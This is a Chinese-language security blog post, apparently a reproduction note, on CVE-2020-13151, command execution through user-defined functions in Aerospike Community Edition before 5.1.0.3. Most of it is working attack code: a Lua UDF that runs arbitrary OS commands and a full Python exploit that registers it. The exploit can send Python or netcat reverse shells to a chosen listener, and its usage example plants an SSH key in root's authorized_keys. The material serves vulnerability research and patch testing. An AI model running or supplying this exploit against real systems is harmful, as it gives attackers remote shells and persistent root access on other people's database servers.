<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞一、漏洞简介攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。 二、漏洞影响Aerospike 社区版 &lt;5.1.0.3 三、复现过程首先导入CVE-2020-13151.lua function runCMD(rec, cmd)     local outtext &#x3D; &amp;quo">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞一、漏洞简介攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。 二、漏洞影响Aerospike 社区版 &lt;5.1.0.3 三、复现过程首先导入CVE-2020-13151.lua function runCMD(rec, cmd)     local outtext &#x3D; &amp;quo">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2022-07-08T06:25:52.041Z">
<meta property="article:modified_time" content="2021-04-21T01:23:46.000Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Aerospike/（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:52.041Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-13151）Aerospike-数据库主机命令执行漏洞"><a href="#（CVE-2020-13151）Aerospike-数据库主机命令执行漏洞" class="headerlink" title="（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞"></a>（CVE-2020-13151）Aerospike 数据库主机命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>攻击者借助特制的UDF利用该漏洞以当前用户权限在该集群的所有节点上执行任意的操作系统命令。</p>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Aerospike 社区版 &lt;5.1.0.3</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><p>首先导入<code>CVE-2020-13151.lua</code></p>
<pre><code>function runCMD(rec, cmd)
    local outtext = &quot;&quot;
    local phandle = io.popen(cmd)
    io.input(phandle)
    local foo = io.lines()
    for f in foo do
        outtext = outtext .. f .. &quot;\n&quot;
    end
    return outtext
end
</code></pre>
<p>3.png</p>
<p>创建单记录测试数据集以进行以下操作：</p>
<p>4.png</p>
<p>然后在最终在我们连接的主机上执行命令：</p>
<p>5.png</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><blockquote>
<p>CVE-2020-13151</p>
</blockquote>
<p>1.png</p>
<p>2.png</p>
<pre><code>#!/usr/bin/env python3
import argparse
import random
import os, sys
from time import sleep
import string

# requires aerospike package from pip
import aerospike
# if this isn&#39;t installing, make sure os dependencies are met
# sudo apt-get install python-dev
# sudo apt-get install libssl-dev
# sudo apt-get install python-pip
# sudo apt-get install zlib1g-dev

PYTHONSHELL = &quot;&quot;&quot;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;&#123;ip&#125;&quot;,&#123;port&#125;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&amp;&quot;&quot;&quot;
NETCATSHELL = &#39;rm /tmp/ft;mkfifo /tmp/ft;cat /tmp/ft|/bin/sh -i 2&gt;&amp;1|nc &#123;ip&#125; &#123;port&#125; &gt;/tmp/ft&amp;&#39;

def _get_client(cfg):
    try:
        return aerospike.client(&#123;
            &#39;hosts&#39;: [(cfg.ahost, cfg.aport)],
             &#39;policies&#39;: &#123;&#39;timeout&#39;: 8000&#125;&#125;).connect()

    except Exception as e:
        print(f&quot;unable to access cluster @ &#123;cfg.ahost&#125;:&#123;cfg.aport&#125;\n&#123;e.msg&#125;&quot;)

def _send(client, cfg, _cmd):
    try:
        print(client.apply((cfg.namespace, cfg.setname, cfg.dummystring ), &#39;poc&#39;, &#39;runCMD&#39;, [_cmd]))
    except Exception as e:
        print(f&quot;[-] UDF execution returned &#123;e.msg&#125;&quot;)

def _register_udf(client, cfg):
    try:
        client.udf_put(cfg.udfpath)
    except Exception as e:
        print(f&quot;[-] whoops, couldn&#39;t register the udf &#123;cfg.udfpath&#125;&quot;)
        raise e

def _random_string(l):
    return &#39;&#39;.join([random.choice(string.ascii_lowercase + string.ascii_uppercase) for i in range(l)])

def _populate_table(client, cfg):
    ns = cfg.namespace
    setname = cfg.setname
    print(f&quot;[+] writing to &#123;ns&#125;.&#123;setname&#125;&quot;)
    try:
        rec = cfg.dummystring
        client.put((ns, setname, rec), &#123;&#39;pk&#39;:cfg.dummystring&#125;)
        print(f&quot;[+] wrote &#123;rec&#125;&quot;)
    except Exception as e:
        print(f&quot;[-] unable to write record: &#123;e.msg&#125;&quot;)
        try:
            if e.msg.startswith(&#39;Invalid namespace&#39;):
                print(&quot;Valid namespaces: &quot;)
                for n in _info_parse(&quot;namespaces&quot;, client).split(&quot;;&quot;):
                    print(n.strip())
        except:
            pass
        sys.exit(13)

def _info_parse(k, client):
    try: 
        return [i[1] for i in client.info_all(k).values() ][0]
    except Exception as e:
        print(f&quot;error retrieving information: &#123;e.msg&#125;&quot;)
        return []

def _is_vuln(_mj, _mi, _pt, _bd):
    fixed = [5,1,0,3]
    found = [_mj, _mi, _pt, _bd]

    if fixed == found:
        return False

    for ix, val in enumerate(found):
        if val &lt; fixed[ix]:
            return True
        elif val == fixed[ix]:
            pass
        else:
            return False


def _version_check(client):
    print(&quot;[+] aerospike build info: &quot;, end=&quot;&quot;)
    try:
        _ver = _info_parse(&quot;build&quot;, client)
        print(_ver)
        mj, mi, pt, bd = [int(i) for i in _ver.split(&#39;.&#39;)]
        if _is_vuln(mj, mi, pt, bd):
            print(&quot;[+] looks vulnerable&quot;)
            return
        else:
            print(f&quot;[-] this instance is patched.&quot;)
            sys.exit(0)

    except Exception as e:
        print(f&quot;[+] unable to interpret build number due to &#123;e&#125;&quot;)
        print(&quot;[+] continuing anyway... &quot;)

def _exploit(cfg):
    client = _get_client(cfg)
    
    if not client:
        return

    _version_check(client)

    print(f&quot;[+] populating dummy table.&quot;)
    _populate_table(client, cfg)

    print(f&quot;[+] registering udf&quot;)
    
    _register_udf(client, cfg)

    if cfg.pythonshell or cfg.netcatshell:
        sys.stdout.flush()
        print(f&quot;[+] sending payload, make sure you have a listener on &#123;cfg.lhost&#125;:&#123;cfg.lport&#125;&quot;, end=&quot;&quot;)
        sys.stdout.flush()
        for i in range(4): 
            print(&quot;.&quot;, end=&quot;&quot;)
            sys.stdout.flush()
            sleep(1)

        print(&quot;.&quot;)
        _send(client, cfg, PYTHONSHELL.format(ip=cfg.lhost,port=cfg.lport) if cfg.pythonshell else NETCATSHELL.format(ip=cfg.lhost,port=cfg.lport) )
    
    if cfg.cmd:
        print(f&quot;[+] issuing command \&quot;&#123;cfg.cmd&#125;\&quot;&quot;)
        _send(client, cfg, cfg.cmd)

if __name__ == &#39;__main__&#39;:
    if len(sys.argv) == 1:
        print(f&quot;[+] usage examples:\n&#123;sys.argv[0]&#125; --ahost 10.11.12.13 --pythonshell --lhost=10.0.0.1 --lport=8000&quot;)
        print(&quot;... or ... &quot;)
        print(f&quot;&#123;sys.argv[0]&#125; --ahost 10.11.12.13 --cmd &#39;echo MYPUBKEY &gt; /root/.ssh/authorized_keys&#39;&quot;)
        sys.exit(0)

    parser = argparse.ArgumentParser(description=&#39;Aerospike UDF Command Execution - CVE-2020-13151 - POC&#39;)
    
    parser.add_argument(&quot;--ahost&quot;, help=&quot;Aerospike host, default 127.0.0.1&quot;, default=&quot;127.0.0.1&quot;)
    parser.add_argument(&quot;--aport&quot;, help=&quot;Aerospike port, default 3000&quot;, default=3000, type=int)
    parser.add_argument(&quot;--namespace&quot;, help=&quot;Namespace in which to create the record set&quot;, default=&quot;test&quot;)
    parser.add_argument(&quot;--setname&quot;, help=&quot;Name of set to populate with dummy record(s), default is cve202013151&quot;, default=None)
    parser.add_argument(&#39;--dummystring&#39;, help=&quot;leave blank for a random value, can use a previously written key to target a specific cluster node&quot;, default=None)
    parser.add_argument(&quot;--pythonshell&quot;, help=&quot;attempt to use a python reverse shell (requires lhost and lport)&quot;, action=&quot;store_true&quot;)
    parser.add_argument(&quot;--netcatshell&quot;, help=&quot;attempt to use a netcat reverse shell (requires lhost and lport)&quot;, action=&quot;store_true&quot;)
    parser.add_argument(&quot;--lhost&quot;, help=&quot;host to use for reverse shell callback&quot;)
    parser.add_argument(&quot;--lport&quot;, help=&quot;port to use for reverse shell callback&quot;)
    parser.add_argument(&quot;--cmd&quot;, help=&quot;custom command to issue against the underlying host&quot;)
    parser.add_argument(&#39;--udfpath&#39;, help=&quot;where is the udf to distribute? defaults to `pwd`/poc.lua&quot;, default=None)

    cfg = parser.parse_args()
    if not cfg.setname:
        cfg.setname = &#39;cve202013151&#39;
    if not cfg.dummystring:
        cfg.dummystring = _random_string(16)
    if not cfg.udfpath:
        cfg.udfpath = os.path.join(os.getcwd(), &#39;poc.lua&#39;)

    assert cfg.cmd or (cfg.lhost and cfg.lport and (cfg.pythonshell or cfg.netcatshell)), &quot;Must specify a command, or a reverse shell + lhost + lport&quot;
    if cfg.pythonshell or cfg.netcatshell:
        assert cfg.lhost and cfg.lport, &quot;Must specify lhost and lport if using a reverse shell&quot;

    _exploit(cfg)
</code></pre>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Aerospike/%EF%BC%88CVE-2020-13151%EF%BC%89Aerospike%20%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%BB%E6%9C%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qlm60011y8v19wu03qkl" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Apache/Apache%E5%90%8E%E9%97%A8%E7%BB%B4%E6%8C%81/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Adobe%20Flash%20Player/%EF%BC%88CVE-2018-4878%EF%BC%89Adobe%20Flash%20Player%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>